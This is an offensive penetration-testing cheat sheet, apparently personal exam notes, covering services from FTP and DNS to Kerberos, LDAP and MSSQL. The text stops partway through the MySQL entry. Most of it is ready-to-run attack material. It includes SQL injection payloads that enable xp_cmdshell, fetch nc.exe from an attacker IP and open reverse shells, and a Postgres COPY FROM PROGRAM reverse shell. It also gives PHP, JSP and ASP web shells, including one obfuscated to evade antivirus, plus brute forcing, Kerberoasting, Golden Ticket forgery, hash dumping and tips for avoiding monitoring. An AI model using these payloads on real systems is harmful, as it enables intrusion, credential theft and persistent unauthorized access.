use 16 (payload/windows/meterpreter/reverse_tcp)
exploit
OR 
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.196;set LPORT 443;run;"

docs.title: SQLi
docs.text:
If SQL Injection is discovered on a target, use the following payload to enable command execution via xp_cmdshell, download nc.exe, and obtain a reverse shell. 

EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.249:8000/nc.exe C:\windows\temp\nc.exe';
EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.249 9005 -e cmd.exe';--
* Bring nc.exe into the terminal window to obtain the shell, then start python server. * URL encode payload and send.

docs.title: Postgres SQLi
docs.text:
CREATE TABLE shell(output text); COPY shell FROM PROGRAM 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.198 9443 >/tmp/f';
NOTE: if you lose connection to the shell, you either need to drop the table (shell in the example above) or use the command with a new table name.

docs.title: Bind Shells
docs.text: A bind shell listens on a port and waits for an attacker to connect.

docs.title: Netcat
docs.text:
Start a listener on the target:

nc -lvp <port> -e /bin/sh

Connect from the attacker's machine:

nc <target-ip> <port>

docs.title: Bash
docs.text: bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'

docs.title: MSFVenom
docs.text:
msfvenom -p linux/x86/shell_bind_tcp LPORT=<port> -f elf > bind.elf

Connect from Metasploit:

use exploit/multi/handler
set payload linux/x86/shell_bind_tcp
set RHOST <target-ip>
set LPORT <port>
exploit

docs.title: Upgrading to a Fully Interactive Shell
docs.text:
Once connected to the target, upgrade the shell if necessary:

python -c 'import pty;pty.spawn("/bin/bash");'

Note: If python is not available, try: 

script /dev/null -c "/bin/bash"

docs.title: Enable Tab-Completion
docs.text:
1. In your active shell press ctrl+z to send your nc session to background
  2. Enter stty raw -echo
  3. Enter fg to bring your nc session to foreground
  4. Enter export TERM=xterm-256color

docs.title: Checking for a Restricted Shell
docs.text:
echo $SHELL
echo $0

If output includes rbash, lshell, or another restricted shell, the environment is likely locked down.

Quick escape attempts

Try these in order — fastest to slowest: 1. vi → :!/bin/bash (works often on misconfigured systems) 2. python3 -c 'import os; os.system("/bin/bash")' 3. perl -e 'exec "/bin/bash"' 4. awk 'BEGIN {system("/bin/bash")}' If PATH is restricted, use full paths: /bin/bash not bash.

Watch out

Some restricted shells log every command. Assume you're being monitored and avoid running suspicious enumeration scripts until you've fully escaped.

docs.title: Escaping rbash
docs.text:
Assuming you have the password to the user, you can escape rbash by adding the following flag for SSH: 

ssh user@ip -t "bash --noprofile"
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Then you'll be

docs.title: Bypassing Restrictions with Built-in Commands
docs.text:
If common utilities like bash, sh, or python are available, attempt execution:

bash -i
sh -i
python -c 'import pty; pty.spawn("/bin/bash")'

If bash is blocked, use the following:

env /bin/sh

docs.title: Breaking Out via Environment Variables
docs.text:
Modify PATH to run unrestricted binaries:

export PATH=/usr/local/bin:/usr/bin:/bin
export SHELL=/bin/bash
/bin/bash

docs.title: Using Special Characters
docs.text:
If command execution is restricted, try:

echo os.system('/bin/sh')
echo "`/bin/sh`"

docs.title: Escaping via File Execution
docs.text:
Create a script that executes an unrestricted shell:

echo "/bin/bash" > /tmp/shell.sh
chmod +x /tmp/shell.sh
/tmp/shell.sh

docs.title: Exploiting Sudo to Escape
docs.text:
If sudo is available, check for misconfigurations:

sudo -l

If a command is available without a password, execute:

sudo /bin/bash

If less is allowed, escape using:

sudo less /etc/passwd
!/bin/sh

docs.title: Using GTFOBins for Escalation
docs.text:
GTFOBins provides known escapes for restricted environments:

curl -s https://gtfobins.github.io/ | grep "SUID" | grep "bash"

docs.title: Upgrading to a Fully Interactive Shell
docs.text:
Once restrictions are bypassed, upgrade the shell:

python -c 'import pty;pty.spawn("/bin/bash");'

Note: If python is not available, try: 

script /dev/null -c "/bin/bash"

docs.title: Enable Tab-Completion
docs.text:
1. In your active shell press ctrl+z to send your nc session to background
  2. Enter stty raw -echo
  3. Enter fg to bring your nc session to foreground
  4. Enter export TERM=xterm-256color

docs.title: Identifying Web Shell Upload Points
docs.text:
Tip

Obfuscate web shells to evade basic AV: <?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?>. For more evasion, use variable variables or string concatenation.

Watch out

Web shells left on a server are an IoC. On a real engagement, document the path, use it, then remove it and confirm deletion in your report.

docs.title: Testing for File Upload Vulnerabilities
docs.text:
If an application allows file uploads, test whether it accepts arbitrary file types:

  1. Check for Upload Restrictions

    • Upload a .php, .asp, .jsp, or .aspx file.

    • Attempt to bypass restrictions by renaming extensions (shell.php.jpg, shell.php;, shell.phtml).

  2. Intercept & Modify Requests with Burp Suite

    • Change the Content-Type header to image/jpeg.

    • Modify file extension filtering mechanisms.

  3. Use Directory Fuzzing to Locate Uploaded Files

ffuf -u http://target.com/uploads/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

docs.title: Basic PHP Web Shell
docs.text:
If the target supports PHP:

<?php system($_GET['cmd']); ?>

Access via browser:

http://target.com/uploads/shell.php?cmd=id

docs.title: Reverse Shell via Web Shell
docs.text:
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'"); ?>

Start a Netcat Listener:

nc -lvnp <port>

Trigger the shell via browser:

http://target.com/uploads/revshell.php

docs.title: MSFVenom PHP Reverse Shell
docs.text:
Generate a Metasploit-compatible payload:

msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<port> -f raw > shell.php

Upload and execute.

docs.title: Python Web Shell
docs.text:
If Python is enabled on the target:

import os
while True:
    cmd = input("Shell> ")
    os.system(cmd)

docs.title: JSP Web Shell
docs.text:
For Java-based applications (Tomcat, JBoss, etc.):

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

Access via:

http://target.com/shell.jsp?cmd=whoami

docs.title: ASP Web Shell
docs.text:
For IIS-based servers:

<%
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c " & Request.QueryString("cmd")
%>

docs.title: Finding & Removing Web Shells
docs.text:
If investigating a compromised system, locate web shells using:

find /var/www/ -type f -name "*.php" -exec grep -l "system(" {} +
grep -R "exec(" /var/www/

To remove, delete the shell:

rm /var/www/html/shell.php

docs.title: Tools for Web Shell Exploitation
docs.text:
• Weevely – Encrypted PHP web shell.

  • China Chopper – Lightweight ASP/PHP shell.

  • Revshells.com – Auto-generate reverse shell payloads.

  • Burp Suite – Intercept and modify upload requests.

docs.title: DNS (53)
docs.text:
Start here

Try zone transfer first: dig axfr @<target> <domain>. If successful, you get the full DNS record set. Most production DNS servers block this, but internal DNS servers often don't.

docs.title: Banner Grabbing
docs.text:
nmap -sU -p 53 --script dns-nsid,dns-version <target-ip>

Dig (Query DNS Version): 

dig CH TXT version.bind @<target-ip>

docs.title: DNS Zone Transfer (AXFR)
docs.text:
A zone transfer allows a secondary DNS server to replicate all DNS records from the primary server. If misconfigured, an attacker can retrieve subdomains, IP addresses, internal networks, and mail servers.

host -t axfr <target-domain> <dns-server>
If successful, the response will contain entire domain records, exposing internal infrastructure.

docs.title: Using Nmap
docs.text: nmap --script=dns-zone-transfer -p53 <target-ip>

docs.title: Subdomain Enumeration
docs.text:
Gobuster: 

gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

Subfinder: 

subfinder -d example.com

Nmap: 

nmap --script dns-brute -p 53 <target-ip>

Amass: 

amass enum -d example.com

docs.title: Reverse DNS Lookup (Hostname)
docs.text:
dig -x <target-ip>

or

nslookup <target-ip>

docs.title: FTP (21)
docs.text:
Start here

Always try anonymous login first: ftp <target> then anonymous:anonymous. Check for write access — if you can write to a web-accessible directory, it's a file upload path.

docs.title: Banner Grabbing
docs.text: nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor $IP

docs.title: Anonymous Login Check
docs.text:
ftp anonymous@$IP

When prompted: 

Name ($IP:root): anonymous
Password: anonymous

List files: 

ftp> ls -la

docs.title: Brute-Forcing FTP
docs.text:
Seclist has a default list of passwords we can try before attempting to use rockyou: 

hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
* -C takes a file in format user:password and try all of the combinations

Metasploit: 

msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS $IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: Enumerate FTP
docs.text:
ftp> status

Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off

ftp> debug

Debugging on (debug=1).

ftp> trace

Packet tracing on.

docs.title: Enumerate Hidden Files
docs.text:
Once logged into an FTP server, attempt the following: 

ls -laR

or use wget to mirror the entire FTP directory: 

wget -m --no-passive ftp://anonymous@$IP

docs.title: Data Exfiltration
docs.text:
ftp> get ftp_file
ftp> put ftp_file

For the exfiltration of binary files, enable binary mode: 

ftp> type binary

docs.title: Uploading a Web Shell
docs.text:
If the FTP server is located in a web directory (/var/www/html), upload a PHP web shell. 

<?php system($_GET['cmd']); ?>

Upload: 

ftp> put shell.php

Access via: 

http://target.com/uploads/shell.php?cmd=id

docs.title: Enumerating FTP Configurations
docs.text:
Locate config files and user permissions and credentials: 

cat /etc/vsftpd.conf
cat /etc/passwd | grep ftp
cat /etc/shadow

docs.title: Reverse Shell via FTP
docs.text:
If writable directories are available, create a reverse shell: 

echo "nc -e /bin/bash <attacker-ip> <port>" > shell.sh
ftp> put shell.sh
ftp> chmod +x shell.sh

And execute remotely: 

ftp> !nc -lvnp <port>
ftp> !./shell.sh

docs.title: IMAP (143, 993)
docs.text:
Start here

Connect with netcat and check capabilities: nc <target> 143 then send a1 CAPABILITY. Look for AUTH=PLAIN or AUTH=LOGIN — if present and port 143 (not IMAPS), credentials travel in cleartext. Try hydra -L users.txt -P passwords.txt imap://<target> with a short wordlist before committing to a full bruteforce.

docs.title: Banner Grabbing
docs.text: nmap -p 143,993 --script imap-capabilities,imap-ntlm-info <target-ip>

docs.title: User Enumeration
docs.text: nmap --script imap-brute -p 143 <target-ip>

docs.title: Brute-Forcing Creds
docs.text:
hydra -L users.txt -P passwords.txt imap://<target-ip> -V

Metasploit: 

msfconsole
use auxiliary/scanner/imap/imap_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: Insecure Authentication
docs.text:
IMAP servers may allow plaintext authentication, making them vulnerable to Man-in-the-Middle (MITM) attacks. 

openssl s_client -connect <target-ip>:143 -starttls imap

If AUTH PLAIN or AUTH LOGIN is returned, plaintext authentication is enabled, making it possible to intercept credentials.

docs.title: Weak or Default Credentials
docs.text:
Login using known/weak credentials to access sensitive email data, including potentially sensitive information (password resets, confidential data, etc.). 

nc -nv <target-ip> 143

docs.title: Check available mailboxes:
docs.text: a LIST "" "*"

docs.title: Select mailbox
docs.text: a SELECT INBOX

docs.title: Read email messages
docs.text: a FETCH 1 BODY[]

docs.title: Email Data Leakage
docs.text: Review retrieved emails for sensitive data, credentials, internal information, or information useful for privilege escalation and lateral movement.

docs.title: NTLM Authentication (Windows environments)
docs.text:
If NTLM authentication is used, it may allow NTLM relay or Pass-the-Hash attacks.

Enumerate NTLM information: 

nmap --script imap-ntlm-info -p 143,993 <target-ip>

Relay NTLM authentication using responder and ntlmrelayx (advanced technique if IMAP clients attempt NTLM auth): 

responder -I eth0 -rdwv

docs.title: Post-Exploitation & Lateral Movement
docs.text:
Once IMAP credentials are compromised:

  1. Attempt SMTP Authentication (Port 25/465/587) – If SMTP authentication is allowed, send emails as the victim.
  2. Use IMAP Access to Hijack Accounts – If MFA is disabled, reset passwords for internal services.
  3. Check for Stored Credentials in Emails – Extract login details, API keys, or private information.
  4. Pivot to Internal Services – If the compromised user has IT privileges, leverage email access for internal enumeration.

docs.title: IPMI (623)
docs.text:
Start here

Dump IPMI hashes unauthenticated with MSF: use auxiliary/scanner/ipmi/ipmi_dumphashes — this works against IPMI 2.0 without needing credentials. Crack the resulting hashes offline with hashcat mode 7300. Default creds (admin:admin, ADMIN:ADMIN, root:calvin) are also worth trying immediately.

docs.title: Checking for Open IMPI Port
docs.text: nmap -sU -p 623 --script ipmi-version <target-ip>

docs.title: Authentication Attacks
docs.text:
IPMI commonly uses default or weak credentials (admin:admin, ADMIN:ADMIN, root:calvin, etc.). Attempt manual login: 

ipmitool -I lanplus -H <target-ip> -U admin -P admin chassis status

Alternatively, we can brute-force credentials using Patator: 

patator ipmi_login host=<target-ip> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:fgrep='Unauthorized name'

or hydra: 

hydra -L users.txt -P passwords.txt ipmi://<target-ip> -V

docs.title: Cipher 0 Auth Bypass
docs.text:
IPMI 2.0 sometimes allows authentication bypass using Cipher 0. Check if Cipher 0 is enabled using the following: 

ipmitool -I lanplus -C 0 -H <target-ip> -U ADMIN -P randompassword user list

If enabled, exploit using the following commands: 

ipmitool -I lanplus -C 0 -H <target-ip> chassis power status

docs.title: Retrieving Sensitive information with Cipher 0 Enabled
Enumerate Users
docs.text: ipmitool -I lanplus -H <target-ip> -U <user> -P <password> user list

docs.title: Access Sensor Data:
docs.text: ipmitool -I lanplus -H <target-ip> -U <user> -P <password> sensor

docs.title: Access System Event Logs:
docs.text: ipmitool -I lanplus -H <target-ip> -U <user> -P <password> sel list

docs.title: Executing Remote Commands
docs.text:
If IMPI grants OS-level access: 

ipmitool -I lanplus -H <target-ip> -U <user> -P <password> shell

If successful, execute whoami or id to confirm.

docs.title: IKE/ISAKMP (500, 4500)
docs.text:
Start here

Probe Aggressive Mode for PSK capture: ike-scan -A $IP — if it responds, capture the PSK hash with ike-scan -A -P ike_psk_params.txt $IP and crack offline with psk-crack -d wordlist.txt ike_psk_params.txt or hashcat mode 5300/5400. Aggressive Mode + PSK is the most common IKEv1 weakness.

docs.title: Key Concepts (quick reference)
docs.text:
• Ports: 500/udp (IKE/ISAKMP), 4500/udp (NAT-T after NAT detected). (IETF Datatracker)

  • IKEv1 modes: Main (safer), Aggressive (can leak data needed for offline PSK cracking). IKEv2 simplifies and is generally preferred. (IETF Datatracker)

  • Common auth: PSK, certificates, or EAP (often with XAUTH in legacy setups).

  • Transform set: Encryption, hash, auth, DH group — often fingerprintable from responders.

docs.title: What to Run First
docs.text:
1. Discovery & basic fingerprinting
sudo nmap -sU -p 500,4500 -sV --script ike-version $IP

Identifies IKE service, vendor IDs, and capabilities. (Nmap)

  1. Deeper enumeration (ike-scan)
ike-scan $IP                # Is IKE responding?
ike-scan -M $IP             # Main Mode transform hints/fingerprint
ike-scan -A $IP             # Aggressive Mode probe (if enabled)
sudo ike-scan -A -P $IP     # Crack aggressive mode pre-shared keys

Use Aggressive Mode only to validate exposure to PSK hash capture. (Kali Linux)

docs.title: Nmap (safe fingerprinting)
docs.text:
sudo nmap -sU -p 500 --script ike-version $IP
  • Returns vendor IDs, features (e.g., DPD, XAUTH). Add -p 4500 if NAT-T likely. (Nmap)

docs.title: ike-scan (active IKEv1 probing)
docs.text:
# Main Mode transforms & backoff fingerprint (less intrusive)
ike-scan -M $IP

# Aggressive Mode test (reveals more; risk = enables PSK capture)
ike-scan -A $IP

# Try with a candidate group name / ID (Aggressive Mode only)
ike-scan -A --id=<GROUP_ID> $IP

Notes: Aggressive Mode responses can include vendor IDs and permit PSK parameter capture. (Debian Manpages)

docs.title: Group/ID & XAUTH enumeration (legacy stacks)
docs.text:
# IKEForce for group/ID enumeration and XAUTH workflows
python3 ikeforce.py $IP -e -w groupnames.txt             # enumerate group IDs
python3 ikeforce.py $IP -b -i <GROUP_ID> -k <PSK> \
  -U users.txt -w passwords.txt                           # XAUTH brute

Helpful where devices leak differences on valid vs invalid IDs or support XAUTH. (Trustwave)

docs.title: IKEv1 Aggressive Mode PSK – offline crack
docs.text:
1. Capture PSK parameters (HASH_R, etc.):
ike-scan -A --id=<GROUP_ID> -P ike_psk_params.txt $IP
  1. Crack with psk-crack:
psk-crack -d wordlist.txt ike_psk_params.txt
  1. Or crack with hashcat (depends on hash family negotiated):
# MD5-based IKE PSK
hashcat -m 5300 ike_psk_params.txt wordlist.txt
# SHA1-based IKE PSK
hashcat -m 5400 ike_psk_params.txt wordlist.txt

This workflow relies on the well-known weakness of Aggressive Mode with PSK allowing offline guessing. (Kali Linux)

docs.title: Group/ID discovery → PSK capture
docs.text: If the gateway requires a correct group name/ID to return PSK parameters, enumerate IDs (e.g., with IKEForce) and then rerun ike-scan -A --id=<GROUP_ID> -P .... (Trustwave)

docs.title: Recognition Cues (what “good/bad” looks like)
docs.text:
• Aggressive Mode response shows SA=(Enc=..., Hash=..., Group=..., Auth=...) and may include VIDs (e.g., Cisco Unity, XAUTH). Presence of Aggressive Mode plus PSK implies offline crack risk. (NCC Group)

  • NAT-T behavior: Initial IKE on 500 then switch/also listen on 4500/udp when NAT detected. Scan both. (IETF Datatracker)

docs.title: Evidence Collection
docs.text:
# Save interactive attempts & timing
script -qc 'ike-scan -M $IP; ike-scan -A --id=<GROUP_ID> -P ike_psk_params.txt $IP' ike-enum.log

# PCAP for report
sudo tcpdump -nn -i <iface> udp port 500 or udp port 4500 -w ike_handshake.pcap

Keep:

  • ike_psk_params.txt (inputs for cracking).

  • ike-enum.log (commands + outputs).

  • ike_handshake.pcap (handshake proof).

docs.title: Bookmarks (tools & references)
docs.text:
• Nmap ike-version NSE script. (Nmap)

  • ike-scan & psk-crack usage/manpage. (Kali Linux)

  • Hashcat example hashes (modes 5300 IKE-PSK MD5, 5400 IKE-PSK SHA1). (hashcat.net)

  • NAT-T (UDP 4500) overview (RFC 3947). (IETF Datatracker)

  • IKEv2 spec (RFC 7296). (IETF Datatracker)

  • Aggressive Mode PSK risk write-ups (Tenable / Trustwave / Raxis). (Tenable®)

docs.title: Kerberos (88)
docs.text:
Start here

Enumerate valid usernames without credentials: kerbrute userenum -d <domain> --dc <target> userlist.txt. Then immediately try ASREPRoasting against those users: GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <target> — accounts without pre-auth required hand you crackable hashes with no password needed.

docs.title: Banner Grabbing
docs.text:
nmap -p 88 -sV --script=krb5-enum-users,krb5-info <target-ip>

If Kerberos is running on a Windows Server, the target is likely a Domain Controller.

docs.title: Enumerating the DC
docs.text:
If LDAP is open (389), retrieve DC information: 

ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" | grep -i "dc="

docs.title: Enumerate Valid Usernames
docs.text:
./kerbrute userenum -d <domain> --dc <target-ip> userlist.txt

Note: kerbrute file located in Cracks

docs.title: Pre-Authentication Bruteforce (AS-REP Roasting)
docs.text:
ASREPRoasting targets accounts with Do not require Kerberos pre-authentication enabled, allowing attackers to extract AS-REP hashes for offline cracking. 

GetNPUsers.py -dc-ip <target-ip> -usersfile userlist.txt -format hashcat <domain>/ -outputfile asrep-hashes.txt

https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py

Cracking hashes: 

hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt --force

docs.title: Check for AS-REP Roastable Accounts
docs.text: Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object { $_.DoesNotRequirePreAuth -eq $true }

docs.title: Kerberoasting (Extracting TGS Tickets for Cracking)
docs.text: Kerberoasting exploits misconfigured service accounts to extract TGS tickets, which contain NTLM hashes crackable offline.

docs.title: Enumerate Service Accounts
docs.text:
Set-ExecutionPolicy Unrestricted
Import-Module .\PowerView.ps1
Get-NetUser -SPN

docs.title: Request a TGS Ticket
docs.text: GetUserSPNs.py -dc-ip <target-ip> <domain>/<user>:<password> -outputfile tgs-tickets.txt

docs.title: Cracking the Ticket hash using Hashcat
docs.text: hashcat -m 13100 tgs-tickets.txt rockyou.txt --force

docs.title: Pass-the-Ticket (Using Captured TGT/TGS)
docs.text: If you obtain a TGT/TGS, use Mimikatz to inject and authenticate without knowing the password.

docs.title: Extract and Inject a Ticket
docs.text:
mimikatz
sekurlsa::tickets /export
kerberos::ptt <ticket.kirbi>
Once injected, access the target service without credentials.

docs.title: Silver Ticket Attack
docs.text: A Silver Ticket allows an attacker to forge TGS tickets for specific services.

docs.title: Forge a Silver Ticket with Mimikatz
docs.text:
mimikatz
kerberos::golden /domain:<domain> /sid:<SID> /target:<dc-ip> /service:cifs /rc4:<NTLM-hash>
A forged Silver Ticket grants persistent access to services like SMB, RDP, or MSSQL.

docs.title: Golden Ticket Attack (Full Domain Control)
docs.text: A Golden Ticket allows an attacker to forge any Kerberos ticket and gain domain admin access.

docs.title: Generate a Golden Ticket
docs.text:
mimikatz
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-SID> /krbtgt:<NTLM-hash> /ticket:<golden-ticket.kirbi>

Once created, inject the ticket: 

kerberos::ptt golden-ticket.kirbi

docs.title: Tools Quick Reference
docs.text:
GetUserSPNs.py (Kerberoasting): 

GetUserSPNs.py <DOMAIN>/<user>:<pass> -request -dc-ip <target-ip>

GetNPUsers.py (ASREPRoasting): 

GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <target-ip>

Pass-the-ticket (Impacket example)**: 

export KRB5CCNAME=user.ccache 
impacket-smbexec -k -no-pass <DOMAIN>/<user>@<target-ip>

docs.title: Lightweight Directory Access Protocol (LDAP) – Ports 389/636
docs.text:
Start here

ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local" with anonymous bind — if it returns data, you have unauthenticated enumeration. Common on misconfigured internal AD environments.

Watch out

LDAP port 389 vs LDAPS 636 — if 389 is filtered, try 636. Some environments only expose the encrypted port externally.

docs.title: Basic Nmap Scan
docs.text: nmap -p 389,636 $IP --script ldap-rootdse,ldap-search

docs.title: Comprehensive Nmap Scan
docs.text: nmap -n -sV --script "ldap* and not brute" $IP

docs.title: NSE Scripts to Use
docs.text:
• ldap-rootdse: Queries the Root DSE (directory service entry).

  • ldap-search: Performs an anonymous search.

  • ldap-novell-getpass: Novell-specific password grabbing.

  • ldap-brute: Brute-forces LDAP login credentials.

docs.title: Bind Types
docs.text:
• Anonymous Bind: No credentials used. Sometimes permitted for read-only access.

  • Simple Bind: Username and password (often DN format).

  • SASL Bind: Supports Kerberos and NTLM (common in AD environments).

docs.title: DN (Distinguished Name) Format
docs.text: cn=John Doe,ou=Users,dc=corp,dc=local

docs.title: Enum Users and Info (Using ldapsearch)
docs.text:
Anonymous bind:

ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"

Authenticated bind:

ldapsearch -x -H ldap://$IP -D 'user@domain.com' -w 'password' -b "dc=corp,dc=local"

Dump user objects only:

ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName

List domain computers:

ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=computer)" cn

Extract DNS hostnames:

ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(dnshostname=*)" dnshostname

docs.title: Vulnerable Pattern
docs.text:
When user-controlled input is used to construct LDAP queries:

search_filter = "(uid=" + user_input + ")"

docs.title: Exploitable Payloads
docs.text:
Attempt to bypass filters:

  • * – wildcard search

  • *)(uid=*) – injects second condition

  • *)(objectClass=*) – broad search

  • *)(!(uid=*)) – logic negation

Example of injection to bypass auth:

username=*)(uid=*)

Can lead to:

  • Authentication bypass

  • Unauthorized data exposure

  • DoS via complex filter injection

docs.title: Credential Hunting in LDAP
docs.text:
Look for these attributes:

  • userPassword

  • unicodePwd

  • sAMAccountName

  • lastLogonTimestamp

  • description (sometimes used to store passwords)

  • pwdLastSet (used for password spraying windows)

Example to search password attributes:

ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=person)" userPassword

Search for plaintext in description fields:

ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(description=*)" description

docs.title: Pivoting and Lateral Movement
docs.text:
Once LDAP access is obtained:

  • Extract valid usernames for password spraying or Kerberos pre-auth attacks (AS-REP roasting).

  • Combine with SMB enumeration (enum4linux, crackmapexec) to identify systems where users are local admins.

  • Identify admin groups:

    ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(memberOf=*)" memberOf

docs.title: Find All Users
docs.text: ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName

docs.title: Find Members of a Group
docs.text: ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" sAMAccountName

docs.title: Search Users With Admin Rights
docs.text: ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName

docs.title: ldapsearch (Linux)
docs.text: apt install ldap-utils

docs.title: CrackMapExec
docs.text: crackmapexec ldap $IP -u usernames.txt -p passwords.txt

docs.title: Enum4Linux (For SMB + LDAP Enumeration)
docs.text: enum4linux-ng $IP

docs.title: ADExplorer (GUI, by Sysinternals – for offline analysis of LDAP dumps)
Dump LDAP via Ntds.dit and SYSTEM Hive (Post-Exploitation)
docs.text:
If Domain Controller is compromised:

secretsdump.py -just-dc -system SYSTEM -ntds ntds.dit LOCAL

docs.title: Pass-the-Hash with LDAP
docs.text: crackmapexec ldap $IP -u <user> -H <NTLM hash>

docs.title: Gaining Access via LLMNR/NTLM Relay to LDAP
docs.text:
ntlmrelayx.py -t ldap://$IP --dump

This will dump LDAP contents if the victim account has privileges.

docs.title: MSSQL (1433)
docs.text:
Start here

Check for SA with blank password: impacket-mssqlclient sa:@<target>. If you get in, try xp_cmdshell immediately — it's often enabled on unmanaged instances. Enable it if not: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE.

Watch out

xp_cmdshell execution is logged. Use it to establish a shell quickly, then switch to a less monitored persistence method.

docs.title: Check for Open MSSQL Ports
docs.text: nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config <target-ip>

docs.title: User Impersonation
docs.text:
If you are able to log into MSSQL with a user who has low privileges, you may be able to impersonate another user with higher privileges. First, use the following to print a table of users to impersonate: 

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

If any results come back, attempt to login: 

EXECUTE AS LOGIN = 'user'

Reference: [[Hokkaido#MSSQL]]

docs.title: RCE via MSSQL
docs.text:
If authentication is obtained, execute remote commands. Impacket: 

impacket-mssqlclient 'DOMAIN/username':'password'@<target-ip> -windows-auth

Run OS commands: 

xp_cmdshell 'whoami';

Using CrackMapExec: 

crackmapexec mssql <target-ip> -u sa -p password --exec "whoami"

docs.title: Brute-Force Credentials
docs.text:
Hydra: 

hydra -L users.txt -P passwords.txt mssql://<target-ip> -V

CrackMapExec: 

crackmapexec mssql <target-ip> -u users.txt -p passwords.txt

MSF: 

msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: MSSQL Command Execution via xp_cmdshell
docs.text:
If you have sysadmin privileges, enable xp_cmdshell to execute system-level commands: 

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

docs.title: Reverse Shell via MSSQL
docs.text:
If SQL Injection is discovered on a target, use the following payload to enable command execution via xp_cmdshell, download nc.exe, and obtain a reverse shell. 

EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.196:8000/nc.exe C:\users\public\nc.exe';
EXEC xp_cmdshell 'C:\users\public\nc.exe 192.168.45.196 9005 -e cmd.exe';--
* Bring nc.exe into the terminal window to obtain the shell, then start python server. * URL encode payload and send.

docs.title: Reverse Shell via Encoded Powershell
docs.text: First, create a payload from https://revshells.com using PowerShell #3 (Base64)

docs.title: Dumping User Creds
docs.text: SELECT name, password_hash FROM sys.sql_logins;

docs.title: Extracting NTLM Hashes
docs.text:
MSF: 

msfconsole
use auxiliary/admin/mssql/mssql_hashdump
set RHOSTS <target-ip>
set USERNAME sa
set PASSWORD <password>
run

docs.title: Cracking MSSQL Hashes
docs.text: hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt

docs.title: Dumping MSSQL Password Hashes
docs.text:
Using Metasploit: 

use auxiliary/admin/mssql/mssql_hashdump
set RHOSTS <target-ip>
set USERNAME sa
set PASSWORD <password>
run

Hashes can be cracked using Hashcat: 

hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt

docs.title: Quick Command References
docs.text:
List all databases: 

SELECT name FROM master..sysdatabases;

List all tables within database: 

USE database_name;
SELECT name FROM sysobjects WHERE xtype='U';

Dump table data: 

SELECT * FROM table_name;

docs.title: MySQL (3306)
docs.text:
Start here

Try root with no password first: mysql -h <target> -u root (no -p flag). Many dev/staging instances have no root password set. If that fails, try root:root, root:mysql, root:toor. Remote MySQL exposure is almost always a misconfiguration — check if FILE privilege is available to write a web shell.

docs.title: Check for Open MySQL Ports
docs.text: nmap -p 3306 --script mysql-info,mysql-users,mysql-enum,mysql-databases <target-ip>

docs.title: Brute-Force
docs.text:
Hydra: 

hydra -L users.txt -P passwords.txt mysql://<target-ip>

MSF: 

